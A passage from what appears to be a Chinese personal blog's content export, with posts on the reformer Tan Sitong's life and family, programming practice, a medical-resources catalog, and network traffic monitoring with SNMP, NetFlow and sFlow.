<h2 id="谭嗣同年谱"><a href="#谭嗣同年谱" class="headerlink" title="谭嗣同年谱"></a>谭嗣同年谱</h2><ul>
<li>1866年（同治四年），生于北京宣武城南孏眠胡同（其父谭继洵时任户部主事）；</li>
<li>1876年（光绪二年），10岁，生母徐氏去世；</li>
<li>1888年（光绪十四年），23岁，在刘人熙的指导下开始研究 <strong>王夫之</strong> 等人的著作，同时搜罗和阅读介绍西方科学、史地、政治的书籍；</li>
<li>1895年（光绪二十一年），30岁。<br>4月17日 <strong>《马关条约》</strong> 签署；谭满怀忧愤，在家乡组织算学社，同时在南台书院设立史学、掌故、舆地等新式课程；<br>5月2日，康有为联合在京参加会试的1000多名举人上书，要求拒和、迁都、变法，史称“公车上书”。</li>
<li>1896年（光绪二十二年），31岁。<br>2月入京，结交 <strong>梁启超、翁同龢</strong> 等人。奉父命捐赀五品知府衔，于江苏南京候补；游历天津、湖南、湖北等地；<br>年底于南京闭门养心读书，开始创作 <strong>《仁学》</strong> ，成2卷。</li>
<li>1897年（光绪二十三年），32岁。<br>1月17日，完成 <strong>《仁学》</strong><br>协助湖南巡抚陈宝箴等人设立 <strong>时务学堂</strong>，筹办内河轮船、开矿、修筑铁路等新政；</li>
<li>1898年（光绪二十四年），33岁。<br>年初，与唐才常在长沙组织 <strong>南学会</strong>，创办《湘报》；<br>4月，翰林院侍读学士徐致靖推荐，光绪皇帝授予四品卿衔、任职军机处章京，参与新政；<br>6月11日，光绪皇帝颁布“明定国是”诏书，宣布变法；<br>9月21日，慈禧太后囚禁光绪皇帝；<br>9月28日，在北京宣武门外的菜市口刑场就义，临刑前高呼：“有心杀贼，无力回天。死得其所，快哉快哉！”。</li>
</ul>
<h4 id="家庭"><a href="#家庭" class="headerlink" title="家庭"></a>家庭</h4><p>父亲：谭继洵（1823年－1901年）字信甫、敬甫，湖南省浏阳县人。谭嗣同生母徐五缘（1829年-1876年）生两女三男；谭继洵妾卢氏亦育有三子二女。</p>
<ul>
<li>道光二十九年（1849年）26岁中举人</li>
<li>咸丰十年（1860年）37岁中庚申恩科进士。</li>
<li>同治元年(1862年)，39岁担任户部广西司主事；</li>
<li>同治四年（1866年）43岁生谭嗣同（第三子）；</li>
<li>同治十一年(1872年)，任户部山西司员外郎；</li>
<li>同治十三年(1874年)，任户部山东司郎中、坐粮厅监督；</li>
<li>光绪三年(1877年)，任巩秦阶道员；</li>
<li>光绪九年(1883年)，任甘肃按察使；</li>
<li>光绪十年(1884年)，任甘肃布政使；</li>
<li>光绪十五年(1889年)，升任湖北巡抚（时任湖广总督张之洞）；</li>
<li>光绪二十年至二十一年底(1894年11月至1896年1月)，湖北巡抚兼署湖广总督；</li>
<li>光绪二十四年(1898年)戊戌变法而受株连，在湖北巡抚任上被罢官；</li>
<li>光绪二十七年(1901年)，卒于浏阳，</li>
</ul>
<blockquote>
<p>谣风遍万国九洲，无非是骂；<br><strong>昭雪在千秋百世，不得而知。</strong><br>——挽长子谭嗣同</p>
</blockquote>
<p>李闰（1865 ～ 1925年），谭嗣同的夫人，咸丰进士、长沙李篁仙之女。投身公益，以家产筹办浏阳第一所女子师范学校，康有为、梁启超合送匾额“巾帼完人”。<br>谭牺牲后，李闰自号“臾生”，表示自己含悲忍辱暂且苟活之意，并写诗道：</p>
<blockquote>
<p>前尘往事不可追，一成相思一层灰 。<br>来世化作采莲人，与君相逢横塘水。</p>
</blockquote>
<h4 id="悼念"><a href="#悼念" class="headerlink" title="悼念"></a>悼念</h4><p>君乘大愿施无畏，立地成佛觉新民<br>剑胆琴心仁学著，来世化作采莲人。</p>
<p>（注：红朝庆丰四年(2016-09-28)祭谭复生）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MrTan_Talk_1.jpg" alt></p>
<h2 id="待续"><a href="#待续" class="headerlink" title="待续"></a>待续</h2><ul>
<li>（待续）江湖大哥：谭嗣同与江湖</li>
<li>（待续）冲决网罗：《仁学》是一部维新派著作吗？</li>
<li>（待续）亡国还是亡天下：谭嗣同是保皇党吗？</li>
<li>（待续）经世致用：西学与中学、政党雏形南学会</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://view.news.qq.com/original/legacyintouch/d559.html" target="_blank" rel="noopener">谭嗣同不是改良派，而是革命党</a></li>
<li><a href="http://agzy.youth.cn/mzh/jng/tst/zdtj/201007/t20100707_1281381.html" target="_blank" rel="noopener">剑胆琴心谭嗣同 | 中国青年网</a></li>
<li><a href="http://agzy.youth.cn/mzh/jng/tst/zdtj/201007/t20100707_1281376.html" target="_blank" rel="noopener">谭嗣同与佛教 | 中国青年网</a></li>
<li><a href="http://www.chinabuddhism.com.cn/special/jlkjc/yrs081/" target="_blank" rel="noopener">杨仁山与金陵刻经处 | 中国佛教协会</a></li>
<li><a href="http://epaper.oeeee.com/epaper/C/html/2016-04/25/content_30481.htm" target="_blank" rel="noopener">再谈谭嗣同精神 | 南方都市报，2016</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4NDMxNzM5MQ==&amp;mid=2650235063&amp;idx=1&amp;sn=4bc5fd7147aa45b6ebc4b1e01f970bae&amp;chksm=87eac517b09d4c0110e2a24e91155ce6d08c89c80b0e3d5f896ff0feaa560f91a00186275ac1&amp;mpshare=1&amp;scene=1&amp;srcid=09169pWh3vJ0S0K6otVD7v4T%23rd" target="_blank" rel="noopener">殉道者谭嗣同：变法流血者，请从嗣同始！|汪兆骞 文钻阅读</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Artistic</tag>
        <tag>讲武堂</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言:编程技巧</title>
    <url>/2016/05/05/OpenSource-Coder/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>1.1 如何阅读源码？</li>
<li>1.2 程序命名规范</li>
</ul>
<blockquote>
<p>If you’re doing an experiment, you should report everything that you think might make it invalid - not only what you think is right about it. —— Richard Feynman</p>
</blockquote>
<a id="more"></a>
<h2 id="一、如何阅读源码？"><a href="#一、如何阅读源码？" class="headerlink" title="一、如何阅读源码？"></a>一、如何阅读源码？</h2><h4 id="1-1-阅读源码的一般流程"><a href="#1-1-阅读源码的一般流程" class="headerlink" title="1.1 阅读源码的一般流程"></a>1.1 阅读源码的一般流程</h4><ol>
<li>划分核心子系统（eg: Linux kernel 进程管理子系统、文件管理子系统）</li>
<li>分析主要数据结构 （结构体）</li>
<li>关键程序列表(加载顺序,调用关系call flow,消息传递路径，性能消耗）</li>
<li>主题式探索、带着目的分析实例（eg: Linux 支持闰秒吗？）</li>
</ol>
<blockquote>
<p>技能提高的秘诀：迫于需要的学习。</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th>Problem Domain</th>
<th>Model</th>
<th>Arch &amp; Implement</th>
<th>Improvement</th>
<th>Best Practice</th>
</tr>
</thead>
<tbody>
<tr>
<td>项目、框架和关键性概念 Architecture Key Concept</td>
<td>——-</td>
<td>问题模型化、验证Demo</td>
<td>——-</td>
<td>——-</td>
</tr>
</tbody>
</table>
</div>
<p>框架为应用而生：平衡技术实现、业务应用、项目</p>
<h4 id="1-2-程序命名规范"><a href="#1-2-程序命名规范" class="headerlink" title="1.2 程序命名规范"></a>1.2 程序命名规范</h4><blockquote>
<p>The most important consistency rules are those that govern naming. The style of a name immediately informs us what sort of thing the named entity is: a type, a variable, a function, a constant, a macro, etc., without requiring us to search for the declaration of that entity. The pattern-matching engine in our brains relies a great deal on these naming rules.</p>
<p>Naming rules are pretty arbitrary, but we feel that consistency is more important than individual preferences in this area, so regardless of whether you find them sensible or not, the rules are the rules.</p>
</blockquote>
<ul>
<li><a href="https://github.com/riboseyim/simple-code-style" target="_blank" rel="noopener">Google Code Style 笔记 - Simple Code Style</a></li>
</ul>
<h2 id="二、编程工具与开发自动化"><a href="#二、编程工具与开发自动化" class="headerlink" title="二、编程工具与开发自动化"></a>二、编程工具与开发自动化</h2><ul>
<li><a href="https://leo108.com/pid-2296/" target="_blank" rel="noopener">API 文档神器 Swagger 介绍及在 PHP 项目中使用 | Leo108’s Blog</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://agiledon.github.com/blog/2014/12/16/the-figure-of-code/" target="_blank" rel="noopener">张逸：代码的体格</a></li>
<li><a href="http://zhangyi.farbox.com/post/coding/feature-of-high-quality-code" target="_blank" rel="noopener">张逸：高质量代码的特征</a></li>
<li><a href="http://cholerae.com/2014/12/30/-%E7%BF%BB%E8%AF%91-%E8%AE%BE%E8%AE%A1%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E5%87%A0%E6%9D%A1%E5%87%86%E5%88%99/" target="_blank" rel="noopener">【翻译】设计线程安全的数据结构的几条准则 | 选自《C++ concurrency in action》chapter 6.2</a></li>
<li><a href="http://steve-yegge.blogspot.com/2008/10/universal-design-pattern.html" target="_blank" rel="noopener">The Universal Design Pattern | STEVE YEGGE KIRKLAND, WASHINGTON, US </a></li>
<li><a href="http://openmymind.net/Tests-Are-About-Design/" target="_blank" rel="noopener">Tests Are About Design | Karl Seguin </a></li>
<li><a href="http://openmymind.net/Software-Crafstmanship-Testing/" target="_blank" rel="noopener">Software Craftsmanship: Testing | Karl Seguin</a></li>
<li><a href="http://abruzzi.github.com/2017/07/tips-for-newbies/" target="_blank" rel="noopener">邱俊涛：如何成为一名优秀的程序员？</a></li>
<li><a href="http://abruzzi.github.com/2017/01/why-top-programmers-hate-gui/" target="_blank" rel="noopener">邱俊涛：为什么优秀的程序员喜欢命令行</a><h4 id="关于重构"><a href="#关于重构" class="headerlink" title="关于重构"></a>关于重构</h4></li>
<li><a href="http://coolshell.cn/articles/17757.html" target="_blank" rel="noopener">如何重构“箭头型”代码 | 酷壳</a></li>
</ul>
<h4 id="Catalog-Language-开发语言"><a href="#Catalog-Language-开发语言" class="headerlink" title="Catalog:Language,开发语言"></a>Catalog:<a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">Language,开发语言</a></h4><p><a href="https://riboseyim.github.io/" target="_blank" rel="noopener">source:https://riboseyim.github.io/</a></p>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSource-DB-ES</title>
    <url>/2018/08/07/OpenSource-DB-ES/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-Apache-Elasticsearch-简介"><a href="#Introduction-Apache-Elasticsearch-简介" class="headerlink" title="Introduction | Apache Elasticsearch 简介"></a>Introduction | Apache Elasticsearch 简介</h2><h2 id="Core-Concept-Apache-Elasticsearch-核心概念"><a href="#Core-Concept-Apache-Elasticsearch-核心概念" class="headerlink" title="Core Concept | Apache Elasticsearch 核心概念"></a>Core Concept | Apache Elasticsearch 核心概念</h2><ul>
<li><a href="#">art</a></li>
</ul>
<h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Apache-Elasticsearch-架构"><a href="#Architecture-Apache-Elasticsearch-架构" class="headerlink" title="Architecture | Apache Elasticsearch 架构"></a>Architecture | Apache Elasticsearch 架构</h2><h2 id="Best-Practice-Apache-Elasticsearch-最佳实践"><a href="#Best-Practice-Apache-Elasticsearch-最佳实践" class="headerlink" title="Best Practice | Apache Elasticsearch 最佳实践"></a>Best Practice | Apache Elasticsearch 最佳实践</h2><h2 id="Apache-Elasticsearch-ABC"><a href="#Apache-Elasticsearch-ABC" class="headerlink" title="Apache Elasticsearch ABC"></a>Apache Elasticsearch ABC</h2><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>Catalog:Medical</title>
    <url>/2017/08/15/Medicine/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>可靠的医学信息源</li>
<li>专题：<a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史：关于瘾品，成瘾机制及其历史</a></li>
<li>专题：<a href="https://riboseyim.github.io/2017/07/19/Medicine-Hepar/" target="_blank" rel="noopener">医学方法论</a><a id="more"></a>
</li>
</ul>
<h2 id="可靠的医学信息源"><a href="#可靠的医学信息源" class="headerlink" title="可靠的医学信息源"></a>可靠的医学信息源</h2><ul>
<li><a href="http://data.worldbank.org.cn/indicator" target="_blank" rel="noopener">世界银行公开数据</a></li>
<li><a href="http://www.who.int/gho/zh/" target="_blank" rel="noopener">WTO:Global Health Observatory (GHO) data</a></li>
<li><a href="https://pubchem.ncbi.nlm.nih.gov/" target="_blank" rel="noopener">美国国家生物技术信息中心</a></li>
</ul>
<p>美国国家生物技术信息中心（National Center for Biotechnology Information，简称NCBI）是美国国家医学图书馆（NLM）的一部分（该图书馆是美国国家卫生研究所的一部分）。NCBI位于美国马里兰州的贝塞斯达，建立于1988年。NCBI保管GenBank的基因测序数据和Medline的生物医学研究论文索引。所有的这些数据库都可以通过Entrez搜索引擎在线访问。</p>
<ul>
<li>NCBI书架</li>
</ul>
<p>NCBI书架是一个集合了可以自由获取、下载的线上精选生物医学书籍数据库。截至2011年4月，书架有845本书籍，涵盖广泛的主题包括分子生物学、生物化学、细胞生物学、遗传学，和微生物学。从分子和细胞从角度分析的疾病状态、研究方法，和病毒学。一些书是以前出版的图书的在线版本，而其他如Coffee Break（书）是由NCBI的工作人员编写和编辑。书架是同行评审的Entrez PubMed库的期刊摘要的补充，因为它能提供前沿领域的已确立的的观点，并整理许多不同的零散的研究报告。</p>
<h2 id="《嗑药简史》"><a href="#《嗑药简史》" class="headerlink" title="《嗑药简史》"></a>《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/" target="_blank" rel="noopener">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h2 id="专题：医学方法论"><a href="#专题：医学方法论" class="headerlink" title="专题：医学方法论"></a>专题：<a href="https://riboseyim.github.io/2017/07/19/Medicine-Hepar/" target="_blank" rel="noopener">医学方法论</a></h2><h4 id="医学常识-NIH-情绪健康检查单"><a href="#医学常识-NIH-情绪健康检查单" class="headerlink" title="医学常识| NIH 情绪健康检查单"></a><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/" target="_blank" rel="noopener">医学常识| NIH 情绪健康检查单</a></h4><h4 id="肝系统健康状况评价指标体系"><a href="#肝系统健康状况评价指标体系" class="headerlink" title="肝系统健康状况评价指标体系"></a><a href="https://riboseyim.github.io/2017/07/19/Medicine-Hepar/" target="_blank" rel="noopener">肝系统健康状况评价指标体系</a></h4><ul>
<li>肝细胞损伤指标: ALT,AST,ALP,GGT</li>
<li>胆红素代谢指标</li>
<li>肝脏合成功能指标: 白蛋白(Alb)</li>
<li>肝纤维化指标</li>
</ul>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="http://www.jianshu.com/p/c43df2f608bb" target="_blank" rel="noopener">读书笔记 |《国士无双伍连德》</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>医学伦理</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NDQ3NTkwMA==&amp;mid=2650141455&amp;idx=1&amp;sn=478739cb63e6247320d84c7533fdbfe6&amp;mpshare=1&amp;scene=1&amp;srcid=0512xNKzhK7pVD70ujb7wowF#rd" target="_blank" rel="noopener">统计之都@李舰：中药、西药及统计学</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI3MDA5NDYzMg==&amp;mid=401766318&amp;idx=1&amp;sn=ac26990e3b5217cf291abea9d92fe7eb&amp;scene=2&amp;srcid=1221OnLT3NzzOKrlXj4AmAeq&amp;from=timeline&amp;isappinstalled=0#wechat_redirect" target="_blank" rel="noopener">欧茜：没有中医、西医之分，只有传统医学与现代医学之分</a></li>
<li><a href="http://songshuhui.net/archives/96047" target="_blank" rel="noopener">李清晨：昨日医学，昨日纠纷</a></li>
<li>传染</li>
<li><a href="http://songshuhui.net/archives/96466" target="_blank" rel="noopener">牵着自己跨越界限——《免疫》译者序</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈基于数据分析的网络态势感知</title>
    <url>/2017/07/14/Network-sFlow/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>态势感知（Situational Awareness，SA）的概念最早在军事领域被提出。20世纪80年代，美国空军就提出了态势感知的概念，覆盖感知（感觉）、理解和预测三个层次。90年代,态势感知的概念开始被逐渐被接受，并随着网络的兴起而升级为“网络态势感知（Cyberspace Situation Awareness，CSA）”，指在大规模网络环境中对能够引起网络态势发生变化的安全要素进行获取、理解、显示以及最近发展趋势的顺延性预测，而最终的目的是要进行决策与行动。本文将围绕以下话题讨论网络态势感知中的几个常见问题：</p>
<ul>
<li>网络感知的基础:网络分层、传感器</li>
<li>网络分析技术：SNMP、NetFlow、sFlow、NetStream、Packet Capturing</li>
<li>网络数据可视化: WireShark、NTopng、Ganglia、GeoIP</li>
</ul>
<span id="more"></span>
<h2 id="一、网络感知的基础"><a href="#一、网络感知的基础" class="headerlink" title="一、网络感知的基础"></a>一、网络感知的基础</h2><h4 id="1、没有任何一个传感器是全能的"><a href="#1、没有任何一个传感器是全能的" class="headerlink" title="1、没有任何一个传感器是全能的"></a>1、没有任何一个传感器是全能的</h4><p>测量一个网络的一般步骤如下：首先获得网络拓扑图，网络的连接方法、潜在的观察点列表等；然后确定潜在观察点，确定该位置所能看到的流量；最后，确定最优的覆盖方案。在复杂网络中，没有任何一个传感器能够全面覆盖，需要多种传感器配合使用。按照采集的领域，传感器可以分为三类：</p>
<ul>
<li>网络：入侵检测系统（IDS）、NetFlow采集器、TCP采集器（如tcpdump）</li>
<li>主机：驻留在主机上，监控主机上的活动（文件访问、登录注销）、网卡流量</li>
<li>服务：邮件消息、特定服务的HTTP请求</li>
</ul>
<h4 id="2、网络分层对传感器的影响"><a href="#2、网络分层对传感器的影响" class="headerlink" title="2、网络分层对传感器的影响"></a>2、网络分层对传感器的影响</h4><p>总的来说，网络传感器的焦点是OSI模型中的第2层～第4层，而服务传感器的焦点是第5层及以上。分层对网络流量的影响中，还需要考虑最大传输单元（MTU）：数据帧尺寸的上限，影响到介质中可以传送的封包的最大尺寸，以太网的MTU为1500字节，即IP封包不会超过这个尺寸。OSI模型第5层会话层需要考虑的情况是会话加密，加密后的信息无法直接理解；在第6层和第7层中，必须知道协议细节，才能提取有意义的信息。   </p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Network_Layer_201707.png" alt="">                                       </p>
<h2 id="二、网络分析技术"><a href="#二、网络分析技术" class="headerlink" title="二、网络分析技术"></a>二、网络分析技术</h2><p>网络流量反映了网络的运行状态，是判别网络运行是否正常的关键。如果网络所接收的流量超过其实际运载能力，就会引起网络性能下降。网络中流量的各种参数主要包括：接收和发送数据报、丢包率、数据报延迟。</p>
<h4 id="1、SNMP"><a href="#1、SNMP" class="headerlink" title="1、SNMP"></a>1、SNMP</h4><p>SNMP（ Simple Network Management Protocol )包含一个应用层协议（application layer protocol）、数据库模型（database schema），和一组数据对象。SNMP的第一个RFC系列出现在1988年(RFC1065-1067)，第二版（RFC1441–1452）作了修订，由于第二版的新安全系统被认为过于复杂而不被广泛接受，因此出现了两个方案：SNMP v2c（基于社区，RFC1901–1908）、SNMP v2u(基于用户，RFC1909–1910)。SNMP第三版（RFC3411-3418）主要增加了安全性方面的强化：信息完整性，保证数据包在发送中没有被窜改；认证，检验信息来自正确的来源；数据包加密，避免被未授权的来源窥探。</p>
<p>基于SNMP协议定义的计数器：ifInOctets、ifOutOctets，两次采样的差值除以间隔时间即可获得平均流量。需要注意的是计数器的数据类型有两种：counter32和counter64。counter32计数的最大值是2的32次方减1，当超过4G的时候，计数器就会清零。如果是大流量、高精度采样（间隔时间低于1分钟），需要考虑使用counter64（ifHCInOctets、ifHCOutOctets）,否则可能出现数据偏差，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 2c -c public -u username 192.168.1.10 ifHCInOctets</span><br><span class="line">IF-MIB::ifHCInOctets.1 = Counter64: 5020760</span><br><span class="line">IF-MIB::ifHCInOctets.2 = Counter64: 12343743</span><br><span class="line">IF-MIB::ifHCInOctets.3 = Counter64: 7123</span><br><span class="line">IF-MIB::ifHCInOctets.21 = Counter64: 3854</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Flow_RRDTool_Demo_1.png" alt=""></p>
<h4 id="2、RMON"><a href="#2、RMON" class="headerlink" title="2、RMON"></a>2、RMON</h4><p>SNMP是基于TCP/IP、应用最广泛的网管协议，但是也有一些明显的不足，如：SNMP使用轮询方式采集数据信息，在大型网络中轮询会产生巨大的网络管理通讯报文；不支持管理进程的分布式管理，它将收集数据的负担加在网管站上，网络管理站会成为瓶颈；只能从这些管理信息库中获得单个设备的局部信息，标准管理信息库MIB-II(RFC1213)和各厂家的专有MIB库主要提供设备端口状态、流量、错误包数等数据，要想获得一个网段的性能信息是比较困难。</p>
<p>因此IETF提出了RMON（Remote Network Monitoring，RFC2021）以解决SNMP所面临的局限性。RMON 由 SNMP MIB 扩展而来，网络监视数据包含了一组统计数据和性能指标，它们在不同的监视器（或称探测器）和控制台系统之间相互交换。它可以主动地监测远程设备，对设备端口所连接的网段上的各种流量信息进行跟踪统计，如某段时间内某网段上报文总数等。只要给予探测器足够的资源，它还可以对数据设备进行防防性监视，设备主动地对网络性能进行诊断并记录网络性能状况，在发生故障时可以把信息及时通知管理者，相关信息分为统计量、历史、告警、事件等四个组，可以预置规则。</p>
<h4 id="3、NetFlow-vs-sFlow-vs-NetStream"><a href="#3、NetFlow-vs-sFlow-vs-NetStream" class="headerlink" title="3、NetFlow vs sFlow vs NetStream"></a>3、NetFlow vs sFlow vs NetStream</h4><p>NetFlow最早由 Cisco 研发的流量汇总标准，最初用于网络服务计费，本意不是为了流量分析和信息安全。它通过路由器提供收集IP网络流量的能力，分析的NetFlow数据（UDP packets）感知网络流量和拥塞情况。NetFlow的核心概念流（Flow），NetFlow直接从 IP Packet 中复制信息，包含来源及目的地、服务的种类等字段：</p>
<ol>
<li>Source and destination IP address</li>
<li>Input and output interface number</li>
<li>Source and destination port number</li>
<li>Layer 4 Protocol</li>
<li>Number of packets in the flow</li>
<li>Total Bytes in the flow</li>
<li>Time stamp in the flow</li>
<li>Source and destination AS</li>
<li>TCP_Flag &amp; TOS</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Flow_Vendor_Supported_201707.png" alt=""></p>
<p><strong>NetFlow vs IPFIX</strong> NetFlow 的主力实现版本是 v5，但是 v5 主要针对 IPv4 存在很多限制，因此 Cisco 推出了基于模版的 NetFlow v9 。在NetFlow v9 的基础上，IETF在2008年发布了标准化的 IPFIX( Internet Protocol Flow Information eXport)（RFC5101/5102），IPFIX 提供了几百种流字段。另外，Juniper也有一套自己的标准 <strong>J-Flow</strong> 。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Network_NetFlow_Arch.png" alt=""></p>
<p><strong>sFlow</strong> (Sampled Flow, 采样流，RFC3176 )是另一种一种基于报文采样的网络流量监控技术，主要用于对网络流量进行统计分析。sFlow 2001年由lnMon公司提出来，目前是IEFE的一个开放标准，可提供完整的第二层到第四层、全网络范围内的流量信息。sFlow 关注的是接口的流量情况、转发情况以及设备整体运行状况，因此适合于网络异 常监控以及网络异常定位，通过 Collector 可以以报表的方式将情况反应出来，特别适合于企业网用户 。sFlow Agent内嵌于网络设备中，在 sFlow 系统中收集流量统计数据发送到 Collector 端供分析。</p>
<p><strong>NetStream</strong> 是H3C定义的一套网络流量的数据统计方法。它需要由特定的设备支持，首先由设备自身对网络流进行初步的统计分析，并把统计信息储存在缓存区。值得注意的是，NetStream（IPv6）功能需要跟华为购买License，并且NetStream功能和sFlow功能不能同时在同一接口板上配置。如果接口板已经配置sFlow功能，则不能配置NetStream功能。</p>
<p>综上所述，各种 NetFlow 方案都是基于网络硬件设施生成或者软件封包为流，不同的厂商标准不同，尤其需要考虑兼容性。同时，各种机制都可能对硬件造成性能问题，特别是旧的型号存在更大的风险，一般不轻易开启。无论是硬件（中高端设备）还是软件（nProbe、nDPI）、NetStream（IPv6），都意味着昂贵的费用，需要充分考虑成本预算。</p>
<h4 id="4、NetFlow的其它替代方案"><a href="#4、NetFlow的其它替代方案" class="headerlink" title="4、NetFlow的其它替代方案"></a>4、NetFlow的其它替代方案</h4><p>基于软件替代路由采集，基本都是采用封包的思路，将pcap文件当作数据源或者直接从网络接口上封包，通过解析Header聚合成流格式或者更丰富的输出。常见的产品如下：</p>
<ul>
<li><a href="http://tools.netsa.cert.org">CERT YAT(Yet Another Flowmeter)</a></li>
<li><a href="http://bit.ly/softflowd">softflowd</a></li>
<li><a href="http://bit.ly/qo-argus">QoSient Argus</a></li>
</ul>
<h4 id="5、协议和用户识别"><a href="#5、协议和用户识别" class="headerlink" title="5、协议和用户识别"></a>5、协议和用户识别</h4><p>   我们可以把数据包想像成一封信。根据解析数据报报头的内容，可以分析IP地址、端口号、协议、报文格式等特征，分类后可以实现对各种应用层协议的准确识别，如P2P（迅雷）、即时通信（QQ、微信）、VPN、邮件等。当然，这只能算是“浅度”的数据包检测，就好像是看看信封上的发件人和收件人 。</p>
<p>   “深度”的数据包检测，可以理解成对信件内容的探查──相比起暴力打开信封，这种基于机器学习的技术更具有艺术性。它并不实际解读数据包的内容，而是搜集周边信息，对数据流进行“肖像刻划”（Profiling）。国内某研究团队曾发表论文“网络流量分类，研究进展与展望”，文章提到了多种使用机器学习进行“深度数据包检测”（Deep Packet Inspection，DPI）的技术。对“墙”有兴趣的同学可以深入了解,<a href="https://riboseyim.github.io/2017/05/12/GFW/">https://riboseyim.github.io/2017/05/12/GFW/</a> 。</p>
